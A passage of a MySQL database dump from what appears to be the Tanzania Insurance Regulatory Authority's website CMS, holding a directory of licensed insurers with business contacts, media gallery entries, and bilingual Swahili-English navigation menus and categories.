SALAAM','Mr. Kumar Sumit Gaurav','255 22 2135121','Life','www.noweb.co,tz','Perpetual',1,'jubilee-life-insurance-company-ltd',9,'2022-08-13 06:09:50','2022-08-13 06:09:50'),(22,'Mayfair Insurance Co. Tanzania Ltd','255715317371/255785317371','255715317371/255785317371','noemail@gmail.com','Dar es salaam','Tan-Re House, 2nd Floor, Plot No. 406 Longido Street Upanga P.O. Box 38353 DAR ES SALAAM','Mr. Sanjay Singh','255715317371/255785317371','Life','www.noweb.go.tz','Perpetual',1,'mayfair-insurance-co-tanzania-ltd',9,'2022-08-13 06:13:16','2022-08-13 06:13:16'),(23,'Metropolitan Tanzania Insurance Company Limited','+255 22 211 0630/1','+255 22 211 0630/1','GFortes@metropolitantz.com','Dar es salaam','Diamond Plaza, 6th Floor P.O. Box 77016 DAR ES SALAAM','AG. Mr. Amani Boma','+255 22 219 7601','Life','www.noweb.co.tz','Perpetual',1,'metropolitan-tanzania-insurance-company-limited',9,'2022-08-13 06:16:45','2022-08-13 06:16:45'),(24,'Metropolitan Tanzania Life Assurance Company Limited','(+255) 22 212 0113','(+255) 22 212 0113','noemeil@gmail.com','Dar es salaam','5th Floor, Diamond Plaza,Crn of Mirambo and Samora Avenue','Amani Boma','(+255) 22 212 0114','Life','www.metropolitantz.com','Perpetual',1,'metropolitan-tanzania-life-assurance-company-limited',9,'2022-08-13 06:19:18','2022-08-13 06:19:18'),(25,'Milembe Insurance','+255 767 149 149','+255 222 103 412','no@gmail.com','Dar es salaam','2nd Floor Viva Towers, Ali Hassan Mwinyi Road Dar es Salaam – City Centre P.O. Box 14548 Dar es Salaam, Tanzania','Lenox Makundi','no','Life','milembeinsurance.co.tz','Perpetual',1,'milembe-insurance',9,'2022-08-13 06:23:51','2022-08-13 06:23:51'),(26,'MO Assurance Company Limited','+255 22 212 7398','+255 22 212 7398','infomoa@moassurance.co.tz','Dar es salaam','8th Floor, CRDB Building Azikiwe Street P.O. Box 20660 DAR ES SALAAM','Mr. Pulin Bihari','+255 22 212 7268','Life','www.moassurance.co.tz','Perpetual',1,'mo-assurance-company-limited',9,'2022-08-13 06:26:41','2022-08-13 06:26:41'),(27,'National Insurance Corp. (T) Ltd','(255) 22 2113823/9','(255) 22 2113823/9','info-nic@nictanzania.com','Dar es salaam','P.O.Box 9264 Dsm','Mr. S. Kamanga','no','Life','www.no.co.tz','Perpetual',1,'national-insurance-corp-t-ltd',9,'2022-08-13 06:33:17','2022-08-13 06:33:17'),(28,'Phoenix of Tanzania Assurance Co. Ltd','+255 22 212 2777','+255 22 212 2777','info@phoenixtanzania.com','Dar es salaam','I.P.S. Bld, 8th Floor Samora Avenue/Azikiwe Street P.O. Box 5961 DAR ES SALAAM','Mr. P.K. Kathuria','+255 22 212 2761',NULL,'www.phoenixtanzania.com',NULL,1,'phoenix-of-tanzania-assurance-co-ltd',9,'2022-08-13 06:39:52','2022-08-13 06:39:52'),(29,'Reliance Insurance Co. Tanzania Ltd','+255 22 212 0088-90','+255 22 212 0088-90','insure@reliance.co.tz','Dar es salaam','Reliance House 3rd & 4th Floor, Plot No 356 United Nation Road Upanga','Mr. Parameswaran Rajaram','+255(22)2112903','Life','www.reliance.co.tz','Perpetual',1,'reliance-insurance-co-tanzania-ltd',9,'2022-08-13 06:43:29','2022-08-13 06:43:29'),(30,'Sanlam General Insurance','+255 786 524 277','+255 22 212 0188','info@sanlamgeneralinsurance.co.tz','Dar es salaam','4th Floor, Amani Place, Ohio Street PO Box 21228 Dar es Salaam','Mr. Manasseh Kawoloka','+255 22 212 0193','Life','www.sanlam.co.tz','Perpetual',1,'sanlam-general-insurance',9,'2022-08-13 06:46:32','2022-08-13 06:46:32');
/*!40000 ALTER TABLE `licensed_entities` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `licensed_entity_categories`
--

DROP TABLE IF EXISTS `licensed_entity_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `licensed_entity_categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `featured` tinyint(1) NOT NULL DEFAULT '0',
  `specials` int(11) DEFAULT NULL,
  `services` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=13 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `licensed_entity_categories`
--

LOCK TABLES `licensed_entity_categories` WRITE;
/*!40000 ALTER TABLE `licensed_entity_categories` DISABLE KEYS */;
INSERT INTO `licensed_entity_categories` VALUES (7,'Insurance Brokers','Insurance Brokers','insurance-brokers',1,'2021-09-14 09:36:38','2022-06-22 15:56:40',0,NULL,NULL),(8,'Insurance Agents','Insurance Agents','insurance-agents',1,'2021-09-14 09:38:57','2022-06-30 15:56:51',1,NULL,NULL),(9,'Insurance Companies','Insurance Companies','insurance-companies',1,'2021-10-13 06:40:40','2022-06-30 15:47:26',1,NULL,NULL),(10,'Loss Adjustors-Assesors','Loss Adjustors-Assesors','loss-adjustors-assesors',1,'2022-08-07 08:05:04','2022-08-07 08:05:04',0,NULL,NULL),(11,'Accredited Reinsurance Companies','Accredited Reinsurance Companies','accredited-reinsurance-companies',1,'2022-08-09 16:24:46','2022-08-09 16:24:46',0,NULL,NULL),(12,'Accredited Reinsurance Brokers','Accredited Reinsurance Brokers','accredited-reinsurance-brokers',1,'2022-08-09 16:25:22','2022-08-09 16:25:22',0,NULL,NULL);
/*!40000 ALTER TABLE `licensed_entity_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `media`
--

DROP TABLE IF EXISTS `media`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `media` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_en` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `title_sw` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8_unicode_ci NOT NULL,
  `content_sw` text COLLATE utf8_unicode_ci NOT NULL,
  `mime` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `path` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `url` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `filename` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `iconurl` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `slug` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `gallery_id` int(10) unsigned NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `media`
--

LOCK TABLES `media` WRITE;
/*!40000 ALTER TABLE `media` DISABLE KEYS */;
INSERT INTO `media` VALUES (6,'','','To develop, promote and maintain an inclusive, efficient, fair, safe and stable insurance market for the benefit and protection of policy holders','To develop, promote and maintain an inclusive, efficient, fair, safe and stable insurance market for the benefit and protection of policy holders','images/jpeg','/uploads/gallery/','','dcdd349637f69175b5682ae11f733070.jpeg','','fa1c310e1527b7310444b2226893a2b9-jpeg',0,1,1,'2021-07-30 09:10:56','2022-08-07 13:19:00'),(7,'','','\"A world-class insurance regulator\"','\"A world-class insurance regulator\"','images/jpeg','/uploads/gallery/','','898ad15214ce2d2118e365c9cf26cfd2.jpeg','','612bcdabb113ed30b94b4b6ea8a67032-jpeg',0,1,1,'2021-07-30 09:12:36','2022-08-07 13:16:49'),(8,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','74561aa69114ec4993291d31afcaf798-jpg',0,2,1,'2021-08-04 01:43:23','2021-08-04 01:43:23'),(9,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','430e297c55a162fe18668ccb3414f615-jpg',0,2,1,'2021-08-04 01:43:25','2021-08-04 01:43:25'),(10,'','','pink caption','caption pink','images/jpeg','/uploads/gallery/','','d681ecbefb1a6d1aac0bb56d67682c7c.jpeg','','6d8ae25f077b72ecdd21998368e8db87-jpg',0,2,1,'2021-08-04 01:43:27','2022-06-21 16:04:26'),(11,'','','good picture','picha kali','images/jpeg','/uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','ef32cc4b7ed92527b9bcabf575ac4e26-jpeg',0,2,0,'2021-08-04 02:45:54','2022-06-21 16:01:01'),(12,'','','good picture','picha kali','images/jpeg','/uploads/gallery/','','94a44036db359de22479f65e0c7bbbf8.jpeg','','7c20645e9271a710e03401433be4de86-jpeg',0,2,0,'2021-08-04 02:45:56','2022-06-21 15:59:24'),(13,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','843a37ceee9ac402b8a32bfaf57d325f-jpg',0,3,1,'2021-08-04 03:02:19','2021-08-04 03:02:19'),(14,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','843a37ceee9ac402b8a32bfaf57d325f-jpg-2',0,3,1,'2021-08-04 03:02:19','2021-08-04 03:02:19'),(15,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','b3d4f9b510ba59324e59423fca8892d7-jpg',0,3,1,'2021-08-04 03:02:23','2021-08-04 03:02:23'),(16,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','ecf279ee42f6f6413ef9f30e9c8b2a96-jpg',0,3,1,'2021-08-04 03:02:24','2021-08-04 03:02:24'),(17,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','f83d2398293f0d726607d3114fd0e4b1-jpg',0,3,1,'2021-08-04 03:02:28','2021-08-04 03:02:28'),(18,'','','','','images/jpg','uploads/gallery/','','1718d33b3df5471a5cd14bbc5c4516cd.jpeg','','7c534271269824a8ea69c610d9c8f32d-jpg',0,3,1,'2021-08-04 03:02:29','2021-08-04 03:02:29'),(19,'Tazama Wabunge Wapewa Elimu na Mamlaka ya Usimamizi wa Shughuli za Bima (TIRA) I Mpango wa Uchumi','Tazama Wabunge Wapewa Elimu na Mamlaka ya Usimamizi wa Shughuli za Bima (TIRA) I Mpango wa Uchumi','','','','','https://www.youtube.com/watch?v=2CJ13qMcyxk','','','good-video-very-very-nice',0,4,1,'2021-08-04 03:27:11','2022-08-13 18:46:28'),(20,'DR. BAGHAYO SAQWARE ANAONGEA (KAMISHNA WA BIMA TANZANIA) - MARCH 21, 2022','DR. BAGHAYO SAQWARE ANAONGEA (KAMISHNA WA BIMA TANZANIA) - MARCH 21, 2022','','','','','https://www.youtube.com/watch?v=LDYwbFsXMZE&t=17s','','','good-music',0,4,1,'2021-08-04 03:27:44','2022-08-13 17:52:02'),(21,'TIRA: Wakulima jiungeni na Bima ina tija','TIRA: Wakulima jiungeni na Bima ina tija','','','','','https://www.youtube.com/watch?v=gLuZwrKTvHg','','','real-possibilities-on-enhancement-of-the-achievable-estimates',0,4,1,'2021-08-04 03:28:21','2022-08-13 18:00:05'),(22,'KAMSHNA WA BIMA AZINDUA OFISI YA BIMA MTAWANYO','KAMSHNA WA BIMA AZINDUA OFISI YA BIMA MTAWANYO','','','','','https://www.youtube.com/watch?v=6SJO21kiSlM','','','management-team',0,4,1,'2021-08-04 03:28:45','2022-08-13 17:50:06'),(23,'','','Professionalism, Customer Centricity, Team Spirit, Integrity and Accountability & Transparency','Professionalism, Customer Centricity, Team Spirit, Integrity and Accountability & Transparency','images/jpeg','/uploads/gallery/','','9d5653b4e78f17256617a839741de13a.jpeg','','a64147600e6914bec2ccd489464313cc-jpeg',0,1,1,'2021-09-22 09:53:42','2022-08-07 13:15:40'),(24,'','','TIRA Ofice','TIRA Ofice','images/jpeg','/uploads/gallery/','','b71f3828d0151f7272c217bc750ba6be.jpeg','','b71f3828d0151f7272c217bc750ba6be-jpeg',0,7,1,'2022-08-13 20:17:13','2022-08-13 20:17:13'),(25,'','','ANYONE CAN INVEST IN INSURANCE','ANYONE CAN INVEST IN INSURANCE','images/jpeg','/uploads/gallery/','','cc123f5a795da37a4493178bc26576c8.jpeg','','cc123f5a795da37a4493178bc26576c8-jpeg',0,8,1,'2022-08-13 20:24:34','2022-08-13 20:24:34');
/*!40000 ALTER TABLE `media` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `media_links`
--

DROP TABLE IF EXISTS `media_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `media_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `link` tinyint(4) DEFAULT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `media_links`
--

LOCK TABLES `media_links` WRITE;
/*!40000 ALTER TABLE `media_links` DISABLE KEYS */;
INSERT INTO `media_links` VALUES (1,'Press Releases','Press Releases','press-releases',NULL,NULL,1,'2021-07-28 06:16:15','2022-06-22 13:45:18',0,5),(2,'Hotuba','Speeches','speeches',NULL,NULL,1,'2021-07-28 06:16:48','2022-06-22 13:45:18',0,1),(4,'Magazines','Magazines','publications/magazines',NULL,NULL,1,'2021-07-28 06:17:43','2022-06-22 13:45:18',0,4),(5,'News in Brief','News in Brief','news',NULL,NULL,1,'2021-07-28 06:18:04','2022-06-22 13:45:18',0,2),(7,'Maktaba ya Video','Video Gallery','galleries/listing/videos',NULL,NULL,1,'2022-06-22 13:43:29','2022-06-22 13:45:18',0,3),(8,'Maktaba ya Picha','Photo Gallery','galleries/listing/photos',NULL,NULL,1,'2022-06-22 13:43:29','2022-06-22 13:45:18',0,3);
/*!40000 ALTER TABLE `media_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `menu_items`
--

DROP TABLE IF EXISTS `menu_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `menu_items` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `menu_id` int(10) unsigned NOT NULL,
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` text COLLATE utf8mb4_unicode_ci,
  `link` tinyint(1) NOT NULL DEFAULT '1',
  `parent` int(10) unsigned NOT NULL,
  `position` int(10) unsigned NOT NULL,
  `has_sidebar` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=154 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `menu_items`
--

LOCK TABLES `menu_items` WRITE;
/*!40000 ALTER TABLE `menu_items` DISABLE KEYS */;
INSERT INTO `menu_items` VALUES (2,'Wasiliana Nasi','Contact Us',1,1,'contacts',NULL,1,0,4,0,'2021-07-28 05:43:18','2022-06-22 13:30:44'),(4,'MMM','FAQs',1,1,'faqs',NULL,1,0,2,0,'2021-07-28 05:44:26','2022-06-22 13:30:44'),(5,'Complaints','Complaints',1,1,'http://tiramis.tira.go.tz','http://tiramis.tira.go.tz',0,0,3,0,'2021-07-28 05:44:47','2022-08-12 06:05:33'),(12,'Ramani','Sitemap',1,4,'sitemap',NULL,1,0,1,0,'2021-08-10 03:46:19','2022-02-07 06:59:30'),(14,'Vigezo na Masharti','Terms and Conditions',1,4,'#',NULL,1,0,2,0,'2021-08-10 04:01:43','2022-02-07 06:59:30'),(15,'Hakimiliki','Copyright Statement',1,4,'#',NULL,1,0,3,0,'2021-08-10 04:01:59','2022-02-07 06:59:30'),(16,'Kanusho','Disclaimer',1,4,'#',NULL,1,0,4,0,'2021-08-10 04:03:00','2022-02-07 06:59:30'),(77,'Kuhusu Sisi','About Us',1,8,'pages/about-us',NULL,1,0,1,0,'2022-03-07 10:31:36','2022-08-14 03:06:25'),(85,'Machapisho','Document Center',1,8,'publications',NULL,1,0,5,0,'2022-03-07 10:34:54','2022-08-14 03:06:25'),(87,'Media Centre & Events','Media Centre & Events',1,8,'#',NULL,1,0,6,0,'2022-03-07 10:35:20','2022-08-14 03:06:25'),(89,'Habari','News in Brief',1,8,'news',NULL,1,87,3,0,'2022-03-07 10:35:39','2022-08-14 03:06:25'),(92,'Photo Gallery','Photo Gallery',1,8,'galleries/listing/photos',NULL,1,87,5,0,'2022-03-07 10:36:21','2022-08-14 03:06:25'),(93,'Video Gallery','Video Gallery',1,8,'galleries/listing/videos',NULL,1,87,6,0,'2022-03-07 10:36:33','2022-08-14 03:06:25'),(110,'Registered Entities','Registered Entities',1,8,'#',NULL,1,0,2,0,'2022-08-06 16:51:17','2022-08-14 03:06:25'),(112,'Insurance Companies','Insurance Companies',1,8,'licensed-entities/insurance-companies',NULL,1,110,1,0,'2022-08-06 17:02:09','2022-08-14 03:06:25'),(113,'Accredited Reinsurance Companies','Accredited Reinsurance Companies',1,8,'licensed-entities/accredited-reinsurance-companies',NULL,1,110,3,0,'2022-08-06 17:03:26','2022-08-14 03:06:25'),(114,'Accredited Reinsurance Brokers','Accredited Reinsurance Brokers',1,8,'licensed-entities/accredited-reinsurance-brokers',NULL,1,110,4,0,'2022-08-06 17:03:43','2022-08-14 03:06:25'),(115,'Insurance Agents','Insurance Agents',1,8,'licensed-entities/insurance-agents',NULL,1,110,5,0,'2022-08-06 17:04:11','2022-08-14 03:06:25'),(116,'Loss Adjustors/Assesors','Loss Adjustors/Assesors',1,8,'licensed-entities/loss-adjustors-assesors',NULL,1,110,6,0,'2022-08-06 17:04:31','2022-08-14 03:06:25'),(124,'Tunafanya Nini','What we Do',1,8,'pages/what-we-do',NULL,1,77,1,0,'2022-08-09 14:57:46','2022-08-14 03:06:25'),(125,'Sisi ni Nani','Who we Are',1,8,'pages/who-we-are',NULL,1,77,2,0,'2022-08-09 14:58:26','2022-08-14 03:06:25'),(126,'Tunamuhudumia Nani','Who we Serve',1,8,'pages/who-we-serve',NULL,1,77,3,0,'2022-08-09 14:59:31','2022-08-14 03:06:25'),(127,'Dhamira na Maono','Mission and Vision',1,8,'pages/mission-and-vision',NULL,1,77,4,0,'2022-08-09 14:59:58','2022-08-14 03:06:25'),(130,'Malengo Yetu','Our Objectives',1,8,'pages/our-objectives',NULL,1,77,5,0,'2022-08-09 15:00:51','2022-08-14 03:06:25'),(131,'Commissioner\'s Desk','Commissioner\'s Desk',1,8,'commissioner-desk',NULL,1,77,6,0,'2022-08-09 15:05:05','2022-08-14 03:06:25'),(132,'Board Members','Board Members',1,8,'administration/board-members',NULL,1,77,7,0,'2022-08-09 15:05:42','2022-08-14 03:06:25'),(133,'Insurance Brokers','Insurance Brokers',1,8,'licensed-entities/insurance-brokers',NULL,1,110,2,0,'2022-08-09 16:20:41','2022-08-14 03:06:25'),(134,'Tafiti na Takwimu','Research and Statistics',1,8,'pages/research-and-statistics',NULL,1,0,4,0,'2022-08-09 16:53:08','2022-08-14 03:06:25'),(135,'Regulatory Framework','Regulatory Framework',1,8,'#',NULL,1,0,3,0,'2022-08-09 16:55:41','2022-08-14 03:06:25'),(136,'Insurance Policy','Insurance Policy',1,8,'publications/insurance-policy',NULL,1,135,1,0,'2022-08-09 17:10:16','2022-08-14 03:06:25'),(137,'Insurance Act','Insurance Act',1,8,'publications/insurance-act',NULL,1,135,2,0,'2022-08-09 17:10:37','2022-08-14 03:06:25'),(138,'Regulations','Regulations',1,8,'publications/insurace-regulations',NULL,1,135,3,0,'2022-08-09 17:11:04','2022-08-14 03:06:25'),(139,'Guidelines','Guidelines',1,8,'publications/guidelines',NULL,1,135,4,0,'2022-08-09 17:11:45','2022-08-14 03:06:25'),(140,'Circulars','Circulars',1,8,'publications/circular',NULL,1,135,5,0,'2022-08-09 17:12:02','2022-08-14 03:06:25'),(141,'Licensing Requirements','Licensing Requirements',1,8,'publications/licensing-requirements',NULL,1,135,6,0,'2022-08-09 17:12:22','2022-08-14 03:06:25'),(142,'Press Release','Press Release',1,8,'press-releases',NULL,1,87,1,0,'2022-08-09 17:47:29','2022-08-14 03:06:25'),(143,'Hotuba','Speeches',1,8,'speeches',NULL,1,87,2,0,'2022-08-09 17:48:22','2022-08-14 03:06:25'),(144,'Magazines','Magazines',1,8,'publications/magazines',NULL,1,87,4,0,'2022-08-09 17:48:53','2022-08-14 03:06:25'),(145,'Staff Mail','Staff Mail',1,1,'https://mail.tira.go.tz/login.php','https://mail.tira.go.tz/login.php',0,0,7,0,'2022-08-13 03:51:46','2022-08-13 03:51:46'),(146,'Accreditation of foreign Reinsurance','Accreditation of foreign Reinsurance',1,8,'publications/accreditation-of-foreign-reinsurance',NULL,1,141,1,0,'2022-08-13 17:56:20','2022-08-14 03:06:25'),(150,'Insurance Agents Licensing','Insurance Agents Licensing',1,8,'publications/insurance-agents-licensing',NULL,1,141,2,0,'2022-08-14 02:53:12','2022-08-14 03:06:25'),(151,'Insurance licensing Brokers','Insurance licensing Brokers',1,8,'publications/insurance-licensing-brokers',NULL,1,141,3,0,'2022-08-14 02:56:11','2022-08-14 03:06:25'),(152,'Insurance Licensing Company','Insurance Licensing Company',1,8,'publications/insurance-licensing-company',NULL,1,141,4,0,'2022-08-14 03:02:44','2022-08-14 03:06:25'),(153,'Accreditation of Foreign Reinsurance Brokers','Accreditation of Foreign Reinsurance Brokers',1,8,'publications/accreditation-of-foreign-reinsurance-brokers',NULL,1,141,5,0,'2022-08-14 03:05:33','2022-08-14 03:06:25');
/*!40000 ALTER TABLE `menu_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `menus`
--

DROP TABLE IF EXISTS `menus`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `menus` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `category` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'main_nav',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `menus`
--

LOCK TABLES `menus` WRITE;
/*!40000 ALTER TABLE `menus` DISABLE KEYS */;
INSERT INTO `menus` VALUES (1,'Top Menu','Top Menu',1,'top_menu','2021-07-28 05:15:07','2021-10-29 09:46:29'),(4,'Footer Menu','Footer Menu',1,'footer_menu','2021-08-10 03:45:27','2021-08-10 03:45:27'),(8,'Main Menu','Main Menu',1,'main_nav','2022-03-07 10:24:00','2022-03-07 10:24:00');
/*!40000 ALTER TABLE `menus` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `migrations` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `migration` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=69 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES (68,'2020_06_14_082300_permission',1);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `model_has_permissions`
--

DROP TABLE IF EXISTS `model_has_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `model_has_permissions` (
  `permission_id` bigint(20) unsigned NOT NULL,
  `model_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`permission_id`,`model_id`,`model_type`),
  KEY `model_has_permissions_model_id_model_type_index` (`model_id`,`model_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `model_has_permissions`
--

LOCK TABLES `model_has_permissions` WRITE;
/*!40000 ALTER TABLE `model_has_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `model_has_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `model_has_roles`
--

DROP TABLE IF EXISTS `model_has_roles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `model_has_roles` (
  `role_id` bigint(20) unsigned NOT NULL,
  `model_type` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `model_id` bigint(20) unsigned NOT NULL,
  PRIMARY KEY (`role_id`,`model_id`,`model_type`),
  KEY `model_has_roles_model_id_model_type_index` (`model_id`,`model_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `model_has_roles`
--

LOCK TABLES `model_has_roles` WRITE;
/*!40000 ALTER TABLE `model_has_roles` DISABLE KEYS */;
INSERT INTO `model_has_roles` VALUES (1,'App\\Models\\User',1),(1,'App\\Models\\User',3),(2,'App\\Models\\User',2),(2,'App\\Models\\User',4);
/*!40000 ALTER TABLE `model_has_roles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `more_infos`
--

DROP TABLE IF EXISTS `more_infos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `more_infos` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `item_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `more_infos`
--

LOCK TABLES `more_infos` WRITE;
/*!40000 ALTER TABLE `more_infos` DISABLE KEYS */;
